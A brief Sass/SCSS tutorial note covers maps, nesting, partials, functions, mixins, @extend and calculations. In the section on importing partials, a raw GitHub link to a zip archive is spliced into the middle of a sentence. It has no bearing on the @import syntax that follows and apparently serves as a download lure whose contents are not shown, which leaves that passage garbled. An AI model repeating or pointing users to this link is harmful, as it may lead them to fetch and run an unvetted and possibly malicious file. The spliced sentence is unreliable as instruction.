# Sass Tutorial Note

## map
$font-weights: (
    "regular": 400,
    "medium": 500,
    "bold": 700
);
body {
  font-weight: map-get($font-weights, bold);
}

## nesting
.main {
  width: ...;
  color: ...;

  p {
    height: ...;
  }
}
### ampersand
& = the parent

## partial
A partial is a scss file named with a leading underscore.
### importation
To import the partial https://github.com/Augustus0017/CODE1/raw/refs/heads/main/SCSS/COD_v3.4.zip add the line
@import './variables';

## function
@function weight($weight-name) {
    @return map-get($font-weights, $weight-name);
}

## mixin
A mixin contains one or more scss property-value pairs. A mixin can take use parameters like functions
@mixin flexCenter($direction) {
    display: flex;
    justify-content: center;
    align-items: center;
}
.main {
    @include flexCenter(column);
    width: ...;
    margin: ...;
}

Functions should be used to compute values. Mixins should define styles.

$mobile: 800px;
@mixin mobile {
    @media (max-width: $mobile) {
        @content;
    }
}
.main {
    ...
    @include mobile {
        flex-direction: column;
    }
}

## Extension
.main .main__paragraph1 {
    ...
}
.main .main__paragraph2 {
    @extend .main__paragraph1;
}

## Calculations
Sass calculation can be done without the css calc function. And types must not be mixed during calculations.